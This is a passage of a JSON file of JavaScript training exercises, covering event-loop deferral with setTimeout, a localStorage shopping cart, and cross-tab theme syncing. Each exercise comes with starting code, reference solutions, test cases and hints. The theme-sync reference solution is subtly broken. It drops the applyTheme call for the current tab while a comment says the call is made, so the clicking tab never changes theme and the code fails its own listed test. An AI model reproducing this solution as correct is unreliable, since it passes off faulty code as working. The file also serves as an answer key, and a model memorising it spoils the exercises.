            "JavaScript"
          ],
          "prerequisites": [
            "Understanding of all three storage mechanisms"
          ],
          "complexity": 8,
          "interviewFrequency": 9,
          "learningPath": "advanced"
        }
      ],
      "tasks": [
        {
          "id": "task_event_loop_1",
          "title": "Simulate Asynchronous UI Updates and Long-Running Tasks",
          "description": "\nImplement a web page with a simple UI that demonstrates the non-blocking nature of JavaScript's event loop when handling asynchronous tasks.\n\n**Requirements:**\n1.  **HTML Structure**: Create a button, a status display area (e.g., a `<div>` or `<p>`), and a result display area.\n2.  **Start Button**: When clicked, it should:\n    *   Immediately update the status display to 'Processing...'.\n    *   Start a simulated long-running, CPU-intensive task (e.g., a `for` loop iterating millions of times).\n    *   After the long-running task completes, update the result display with the task's outcome.\n    *   Finally, update the status display to 'Done'.\n3.  **Ensure Responsiveness**: The UI (specifically the 'Processing...' status) must appear *before* the long-running task starts and blocks the main thread. If the task is synchronous, the UI will freeze. You need to use `setTimeout(0)` or similar asynchronous mechanisms to achieve this.\n4.  **No Blocking**: The long-running task should not block the initial UI update, even if it runs on the main thread.\n\n**Goal**: Visually confirm that the 'Processing...' message renders before the browser becomes unresponsive due to the heavy computation.",
          "difficulty": "medium",
          "startingCode": "<!-- index.html -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Event Loop Task</title>\n    <style>\n        body { font-family: sans-serif; margin: 20px; }\n        #status { font-weight: bold; margin-top: 10px; }\n        #result { color: green; margin-top: 5px; }\n        button { padding: 10px 15px; cursor: pointer; }\n    </style>\n</head>\n<body>\n    <h1>Asynchronous Task Demonstration</h1>\n    <button id=\"startButton\">Start Heavy Task</button>\n    <div id=\"status\">Idle</div>\n    <div id=\"result\"></div>\n\n    <script>\n        const startButton = document.getElementById('startButton');\n        const statusDiv = document.getElementById('status');\n        const resultDiv = document.getElementById('result');\n\n        function performHeavyCalculation() {\n            // Simulate a CPU-intensive task\n            let sum = 0;\n            for (let i = 0; i < 500000000; i++) { // Adjust count for noticeable delay\n                sum += i;\n            }\n            return sum;\n        }\n\n        startButton.addEventListener('click', () => {\n            // TODO: Implement the logic here\n            // 1. Update status to 'Processing...'\n            // 2. Schedule the heavy calculation using setTimeout(0)\n            // 3. Inside the setTimeout callback, perform calculation, update result, then update status to 'Done'\n        });\n    </script>\n</body>\n</html>\n",
          "solutionCode": "<!-- index.html -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Event Loop Task</title>\n    <style>\n        body { font-family: sans-serif; margin: 20px; }\n        #status { font-weight: bold; margin-top: 10px; }\n        #result { color: green; margin-top: 5px; }\n        button { padding: 10px 15px; cursor: pointer; }\n    </style>\n</head>\n<body>\n    <h1>Asynchronous Task Demonstration</h1>\n    <button id=\"startButton\">Start Heavy Task</button>\n    <div id=\"status\">Idle</div>\n    <div id=\"result\"></div>\n\n    <script>\n        const startButton = document.getElementById('startButton');\n        const statusDiv = document.getElementById('status');\n        const resultDiv = document.getElementById('result');\n\n        function performHeavyCalculation() {\n            let sum = 0;\n            for (let i = 0; i < 500000000; i++) { \n                sum += i;\n            }\n            return sum;\n        }\n\n        startButton.addEventListener('click', () => {\n            // Step 1: Immediately update status. This is synchronous and renders before script continues.\n            statusDiv.textContent = 'Processing...';\n            resultDiv.textContent = ''; // Clear previous result\n            startButton.disabled = true; // Disable button to prevent multiple clicks\n\n            // Step 2 & 3: Schedule the heavy calculation to run AFTER the current Call Stack clears\n            // This allows the browser to render 'Processing...' before the heavy task starts.\n            setTimeout(() => {\n                const startTime = performance.now();\n                const calculationResult = performHeavyCalculation();\n                const endTime = performance.now();\n                const duration = ((endTime - startTime) / 1000).toFixed(2);\n\n                resultDiv.textContent = `Calculation complete: ${calculationResult} (took ${duration} seconds)`;\n                statusDiv.textContent = 'Done';\n                startButton.disabled = false;\n                console.log('Heavy calculation finished and UI updated.');\n            }, 0); \n\n            console.log('Button click handler finished, calculation scheduled.');\n        });\n    </script>\n</body>\n</html>\n",
          "testCases": [
            "Clicking the 'Start Heavy Task' button should immediately change the status to 'Processing...'.",
            "The browser tab should not visibly freeze or become unresponsive before 'Processing...' appears.",
            "After a noticeable delay, the result area should update with the calculation result, and the status should change to 'Done'.",
            "The button should be disabled during processing and re-enabled after completion.",
            "Open browser developer tools, go to the 'Performance' tab, and record. Verify that the heavy calculation appears as a long task block *after* the initial DOM updates (layout/paint) for 'Processing...'. This visually confirms the deferral."
          ],
          "hints": [
            "Remember that JavaScript is single-threaded. To prevent UI blocking, you need to allow the browser's rendering engine a chance to update the DOM.",
            "The `setTimeout(callback, 0)` trick is specifically designed for situations where you want to defer a task until *after* the current synchronous execution context completes, including any pending rendering updates."
          ],
          "tags": [
            "JavaScript",
            "Event Loop",
            "Asynchronous",
            "UI Responsiveness",
            "Performance",
            "Web APIs"
          ],
          "timeEstimate": 45,
          "prerequisites": [
            "HTML/CSS Basics",
            "DOM Manipulation",
            "Understanding of `setTimeout`",
            "Theory: Event Loop and Asynchronous JavaScript"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "Call Stack",
            "Callback Queue",
            "Web APIs",
            "Browser Rendering"
          ]
        },
        {
          "id": "task_web_storage_1",
          "title": "Build a Shopping Cart with Local Storage",
          "description": "\nCreate a simple web page that simulates a shopping cart functionality using `localStorage` to persist the cart items.\n\n**Requirements:**\n1.  **HTML Structure**: Display a list of available products (e.g., 'Laptop', 'Mouse', 'Keyboard'). Each product should have an 'Add to Cart' button.\n2.  **Cart Display**: Show the current items in the cart on the same page, including the quantity of each item. An empty cart message should be displayed when applicable.\n3.  **Add to Cart**: When a product's 'Add to Cart' button is clicked:\n    *   Add the product to the cart or increment its quantity if already present.\n    *   Update the `localStorage` to reflect the new cart state.\n    *   Update the cart display on the page.\n4.  **Persistence**: The cart items should remain in `localStorage` even if the user closes and reopens the browser or navigates away and comes back to the page.\n5.  **Clear Cart**: Add a 'Clear Cart' button that removes all items from the cart, clears `localStorage`, and updates the display.\n\n**Data Structure**: Store the cart as an array of objects in `localStorage`, where each object has `id`, `name`, and `quantity` properties (e.g., `[{ id: 'prod1', name: 'Laptop', quantity: 1 }]`).",
          "difficulty": "medium",
          "startingCode": "<!-- index.html -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Shopping Cart</title>\n    <style>\n        body { font-family: sans-serif; margin: 20px; display: flex; gap: 40px; }\n        .products, .cart { border: 1px solid #ccc; padding: 15px; border-radius: 5px; min-width: 300px; }\n        h2 { margin-top: 0; }\n        ul { list-style: none; padding: 0; }\n        li { margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center; }\n        button { padding: 5px 10px; cursor: pointer; }\n        #clearCartBtn { margin-top: 20px; background-color: #f44336; color: white; border: none; }\n    </style>\n</head>\n<body>\n    <div class=\"products\">\n        <h2>Available Products</h2>\n        <ul id=\"productList\">\n            <li data-id=\"prod1\" data-name=\"Laptop\">Laptop <button>Add to Cart</button></li>\n            <li data-id=\"prod2\" data-name=\"Mouse\">Mouse <button>Add to Cart</button></li>\n            <li data-id=\"prod3\" data-name=\"Keyboard\">Keyboard <button>Add to Cart</button></li>\n        </ul>\n    </div>\n\n    <div class=\"cart\">\n        <h2>Your Cart</h2>\n        <ul id=\"cartItems\">\n            <!-- Cart items will be rendered here -->\n        </ul>\n        <p id=\"emptyCartMessage\">Your cart is empty.</p>\n        <button id=\"clearCartBtn\">Clear Cart</button>\n    </div>\n\n    <script>\n        const productList = document.getElementById('productList');\n        const cartItemsList = document.getElementById('cartItems');\n        const emptyCartMessage = document.getElementById('emptyCartMessage');\n        const clearCartBtn = document.getElementById('clearCartBtn');\n\n        // Type definition for a cart item\n        // interface CartItem { id: string; name: string; quantity: number; }\n\n        // Function to load cart from localStorage\n        function loadCart() {\n            const cartString = localStorage.getItem('shoppingCart');\n            return cartString ? JSON.parse(cartString) : [];\n        }\n\n        // Function to save cart to localStorage\n        function saveCart(cart) {\n            localStorage.setItem('shoppingCart', JSON.stringify(cart));\n        }\n\n        // Function to render cart items to the DOM\n        function renderCart(cart) {\n            cartItemsList.innerHTML = ''; // Clear current display\n            if (cart.length === 0) {\n                emptyCartMessage.style.display = 'block';\n            } else {\n                emptyCartMessage.style.display = 'none';\n                cart.forEach(item => {\n                    const li = document.createElement('li');\n                    li.textContent = `${item.name} (x${item.quantity})`;\n                    cartItemsList.appendChild(li);\n                });\n            }\n        }\n\n        // Event listener for adding items to cart\n        productList.addEventListener('click', (event) => {\n            if (event.target.tagName === 'BUTTON') {\n                const productLi = event.target.closest('li');\n                const productId = productLi.dataset.id;\n                const productName = productLi.dataset.name;\n\n                // TODO: Implement logic to add product to cart:\n                // 1. Load current cart.\n                // 2. Check if product exists; if so, increment quantity.\n                // 3. If not, add new product with quantity 1.\n                // 4. Save updated cart to localStorage.\n                // 5. Re-render cart.\n            }\n        });\n\n        // Event listener for clearing the cart\n        clearCartBtn.addEventListener('click', () => {\n            // TODO: Implement logic to clear cart:\n            // 1. Clear cart in localStorage.\n            // 2. Re-render cart (should show empty message).\n        });\n\n        // Initialize cart on page load\n        document.addEventListener('DOMContentLoaded', () => {\n            renderCart(loadCart());\n        });\n    </script>\n</body>\n</html>\n",
          "solutionCode": "<!-- index.html -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Shopping Cart</title>\n    <style>\n        body { font-family: sans-serif; margin: 20px; display: flex; gap: 40px; }\n        .products, .cart { border: 1px solid #ccc; padding: 15px; border-radius: 5px; min-width: 300px; }\n        h2 { margin-top: 0; }\n        ul { list-style: none; padding: 0; }\n        li { margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center; }\n        button { padding: 5px 10px; cursor: pointer; }\n        #clearCartBtn { margin-top: 20px; background-color: #f44336; color: white; border: none; }\n    </style>\n</head>\n<body>\n    <div class=\"products\">\n        <h2>Available Products</h2>\n        <ul id=\"productList\">\n            <li data-id=\"prod1\" data-name=\"Laptop\">Laptop <button>Add to Cart</button></li>\n            <li data-id=\"prod2\" data-name=\"Mouse\">Mouse <button>Add to Cart</button></li>\n            <li data-id=\"prod3\" data-name=\"Keyboard\">Keyboard <button>Add to Cart</button></li>\n        </ul>\n    </div>\n\n    <div class=\"cart\">\n        <h2>Your Cart</h2>\n        <ul id=\"cartItems\">\n            <!-- Cart items will be rendered here -->\n        </ul>\n        <p id=\"emptyCartMessage\">Your cart is empty.</p>\n        <button id=\"clearCartBtn\">Clear Cart</button>\n    </div>\n\n    <script>\n        const productList = document.getElementById('productList');\n        const cartItemsList = document.getElementById('cartItems');\n        const emptyCartMessage = document.getElementById('emptyCartMessage');\n        const clearCartBtn = document.getElementById('clearCartBtn');\n\n        // Interface for a cart item (for clarity, not strictly needed for vanilla JS)\n        // type CartItem = { id: string; name: string; quantity: number; };\n\n        // Function to load cart from localStorage\n        function loadCart() {\n            const cartString = localStorage.getItem('shoppingCart');\n            try {\n                return cartString ? JSON.parse(cartString) : [];\n            } catch (e) {\n                console.error(\"Error parsing cart from localStorage:\", e);\n                return []; // Return empty cart on parse error\n            }\n        }\n\n        // Function to save cart to localStorage\n        function saveCart(cart) {\n            localStorage.setItem('shoppingCart', JSON.stringify(cart));\n        }\n\n        // Function to render cart items to the DOM\n        function renderCart(cart) {\n            cartItemsList.innerHTML = ''; // Clear current display\n            if (cart.length === 0) {\n                emptyCartMessage.style.display = 'block';\n            } else {\n                emptyCartMessage.style.display = 'none';\n                cart.forEach(item => {\n                    const li = document.createElement('li');\n                    li.textContent = `${item.name} (x${item.quantity})`;\n                    cartItemsList.appendChild(li);\n                });\n            }\n        }\n\n        // Event listener for adding items to cart\n        productList.addEventListener('click', (event) => {\n            if (event.target.tagName === 'BUTTON') {\n                const productLi = event.target.closest('li');\n                if (!productLi) return; // Ensure a product li was clicked\n                const productId = productLi.dataset.id;\n                const productName = productLi.dataset.name;\n\n                let cart = loadCart();\n                const existingItem = cart.find(item => item.id === productId);\n\n                if (existingItem) {\n                    existingItem.quantity++;\n                } else {\n                    cart.push({ id: productId, name: productName, quantity: 1 });\n                }\n\n                saveCart(cart);\n                renderCart(cart);\n            }\n        });\n\n        // Event listener for clearing the cart\n        clearCartBtn.addEventListener('click', () => {\n            localStorage.removeItem('shoppingCart'); // Or localStorage.clear() if it's the only item\n            renderCart([]); // Render with an empty array\n        });\n\n        // Initialize cart on page load\n        document.addEventListener('DOMContentLoaded', () => {\n            renderCart(loadCart());\n        });\n    </script>\n</body>\n</html>\n",
          "testCases": [
            "Adding a new product: Click 'Add to Cart' for 'Laptop'. 'Laptop (x1)' should appear in the cart.",
            "Adding an existing product: Click 'Add to Cart' for 'Laptop' again. 'Laptop (x2)' should appear.",
            "Persistence: Add items, then close and reopen the browser tab. The items should still be in the cart.",
            "Clear cart: Click 'Clear Cart'. The cart display should show 'Your cart is empty.'",
            "Multiple items: Add 'Laptop', 'Mouse', then 'Laptop' again. Cart should show 'Mouse (x1)', 'Laptop (x2)'.",
            "Invalid JSON in localStorage: Manually corrupt 'shoppingCart' in dev tools (e.g., set to 'abc'). Reload page. Cart should load as empty (due to `try...catch`) without errors."
          ],
          "hints": [
            "Remember that `localStorage` only stores strings. You'll need `JSON.stringify()` to save objects/arrays and `JSON.parse()` to retrieve them.",
            "When adding a product, check if it already exists in the cart array. If it does, increment its `quantity`; otherwise, add a new item.",
            "Ensure your `renderCart` function completely re-renders the cart to reflect the latest state from `localStorage`."
          ],
          "tags": [
            "Web APIs",
            "Local Storage",
            "DOM Manipulation",
            "Frontend Development",
            "Data Persistence"
          ],
          "timeEstimate": 60,
          "prerequisites": [
            "HTML/CSS Basics",
            "DOM Manipulation",
            "JSON Serialization/Deserialization",
            "Array methods (`find`, `push`)"
          ],
          "complexity": 7,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "Client-Side Storage",
            "User Experience",
            "State Management (basic)"
          ]
        },
        {
          "id": "task_web_storage_2",
          "title": "Cross-Tab Theme Synchronization with Storage Events",
          "description": "\nCreate a web page that allows a user to switch themes (light/dark) and synchronize this theme preference across all open tabs/windows of the same origin using `localStorage` and `storage` events.\n\n**Requirements:**\n1.  **HTML Structure**: A button to toggle the theme and a display area to show the current theme (e.g., 'Current Theme: Dark'). The `body` element should have a class that indicates the current theme (e.g., `dark-theme` or `light-theme`).\n2.  **Initial Theme Load**: On page load, the theme should be loaded from `localStorage`. If no preference is found, default to 'light'.\n3.  **Theme Toggle**: Clicking the button should toggle the theme, update `localStorage`, and apply the new theme class to the `body`.\n4.  **Cross-Tab Synchronization**: When the theme is changed in one tab, all other open tabs/windows from the same origin should automatically update their theme to match, without requiring a page reload in those tabs.\n\n**Hint**: Use the `storage` event listener on `window` to detect changes made by other tabs.",
          "difficulty": "hard",
          "startingCode": "<!-- index.html -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Theme Synchronizer</title>\n    <style>\n        body {\n            font-family: sans-serif;\n            margin: 20px;\n            transition: background-color 0.3s, color 0.3s;\n        }\n        .light-theme {\n            background-color: #f0f0f0;\n            color: #333;\n        }\n        .dark-theme {\n            background-color: #333;\n            color: #f0f0f0;\n        }\n        button { padding: 10px 15px; cursor: pointer; margin-top: 15px; }\n    </style>\n</head>\n<body>\n    <h1>Theme Synchronization</h1>\n    <p>Current Theme: <span id=\"currentThemeDisplay\"></span></p>\n    <button id=\"toggleThemeBtn\">Toggle Theme</button>\n\n    <script>\n        const themeKey = 'userPreferredTheme'; // Key for localStorage\n        const toggleThemeBtn = document.getElementById('toggleThemeBtn');\n        const currentThemeDisplay = document.getElementById('currentThemeDisplay');\n\n        // Function to apply a theme to the body\n        function applyTheme(theme) {\n            document.body.classList.remove('light-theme', 'dark-theme');\n            document.body.classList.add(`${theme}-theme`);\n            currentThemeDisplay.textContent = theme.charAt(0).toUpperCase() + theme.slice(1); // Capitalize\n        }\n\n        // Function to get current theme from localStorage or default\n        function getStoredTheme() {\n            return localStorage.getItem(themeKey) || 'light';\n        }\n\n        // Function to toggle and save theme\n        function toggleAndSaveTheme() {\n            let currentTheme = getStoredTheme();\n            let newTheme = currentTheme === 'light' ? 'dark' : 'light';\n            localStorage.setItem(themeKey, newTheme); // Save to localStorage\n            applyTheme(newTheme); // Apply immediately to current tab\n        }\n\n        // Event listener for button click\n        toggleThemeBtn.addEventListener('click', toggleAndSaveTheme);\n\n        // TODO: Add an event listener for 'storage' events here\n        // This listener should update the theme if it was changed in another tab.\n\n        // Initial load: Apply the stored theme\n        document.addEventListener('DOMContentLoaded', () => {\n            applyTheme(getStoredTheme());\n        });\n    </script>\n</body>\n</html>\n",
          "solutionCode": "<!-- index.html -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Theme Synchronizer</title>\n    <style>\n        body {\n            font-family: sans-serif;\n            margin: 20px;\n            transition: background-color 0.3s, color 0.3s;\n        }\n        .light-theme {\n            background-color: #f0f0f0;\n            color: #333;\n        }\n        .dark-theme {\n            background-color: #333;\n            color: #f0f0f0;\n        }\n        button { padding: 10px 15px; cursor: pointer; margin-top: 15px; }\n    </style>\n</head>\n<body>\n    <h1>Theme Synchronization</h1>\n    <p>Current Theme: <span id=\"currentThemeDisplay\"></span></p>\n    <button id=\"toggleThemeBtn\">Toggle Theme</button>\n\n    <script>\n        const themeKey = 'userPreferredTheme'; // Key for localStorage\n        const toggleThemeBtn = document.getElementById('toggleThemeBtn');\n        const currentThemeDisplay = document.getElementById('currentThemeDisplay');\n\n        // Function to apply a theme to the body\n        function applyTheme(theme) {\n            document.body.classList.remove('light-theme', 'dark-theme');\n            document.body.classList.add(`${theme}-theme`);\n            currentThemeDisplay.textContent = theme.charAt(0).toUpperCase() + theme.slice(1); // Capitalize\n        }\n\n        // Function to get current theme from localStorage or default\n        function getStoredTheme() {\n            return localStorage.getItem(themeKey) || 'light';\n        }\n\n        // Function to toggle and save theme\n        function toggleAndSaveTheme() {\n            let currentTheme = getStoredTheme();\n            let newTheme = currentTheme === 'light' ? 'dark' : 'light';\n            localStorage.setItem(themeKey, newTheme); // Save to localStorage\n            // Note: applyTheme(newTheme) is called here for the current tab.\n            // The storage event listener will handle other tabs.\n        }\n\n        // Event listener for button click\n        toggleThemeBtn.addEventListener('click', toggleAndSaveTheme);\n\n        // Event listener for 'storage' events (for cross-tab synchronization)\n        window.addEventListener('storage', (event) => {\n            // Check if the changed key is our theme key and it's from localStorage\n            if (event.key === themeKey && event.storageArea === localStorage) {\n                // Update the theme in this tab based on the new value from the event\n                const newTheme = event.newValue || 'light'; // event.newValue will be null if item was removed\n                applyTheme(newTheme);\n                console.log(`Theme synchronized from another tab: ${newTheme}`);\n            }\n        });\n\n        // Initial load: Apply the stored theme\n        document.addEventListener('DOMContentLoaded', () => {\n            applyTheme(getStoredTheme());\n        });\n    </script>\n</body>\n</html>\n",
          "testCases": [
            "Initial load: Open the page. It should default to 'light' theme if no preference is stored, or load the last saved preference.",
            "Toggle in one tab: Click 'Toggle Theme' button. The theme should switch (e.g., light -> dark), and the display should update.",
            "Cross-tab synchronization: Open the same page in two browser tabs. Toggle the theme in Tab A. Tab B should automatically update its theme and display without refresh.",
            "Multiple toggles: Rapidly toggle the theme multiple times in one tab, ensure other tabs keep up.",
            "Clear localStorage: Clear `localStorage` in dev tools, then reload. Page should revert to 'light' theme."
          ],
          "hints": [
            "The `storage` event is fired on `window` when a `localStorage` item is changed in *another* tab/window from the same origin. It is *not* fired in the tab that made the change.",
            "The `event` object of the `storage` event contains `key`, `oldValue`, `newValue`, `url`, and `storageArea` properties, which are useful for identifying what changed and where.",
            "Make sure your `applyTheme` function correctly updates both the `body` class and the text display."
          ],
          "tags": [
            "Web APIs",
            "Local Storage",
            "Storage Event",
            "Cross-Tab Communication",
            "Frontend Architecture",
            "User Experience"
          ],
          "timeEstimate": 75,
          "prerequisites": [
            "HTML/CSS Basics",
            "DOM Manipulation",
            "Understanding of Local Storage",
            "Event Listeners"
          ],
          "complexity": 8,
          "interviewRelevance": 8,
          "learningPath": "advanced",
          "relatedConcepts": [
            "Client-Side Storage",
            "Browser APIs",
            "Event Handling",
            "State Synchronization"
          ]
        }
      ]
    }
  }
]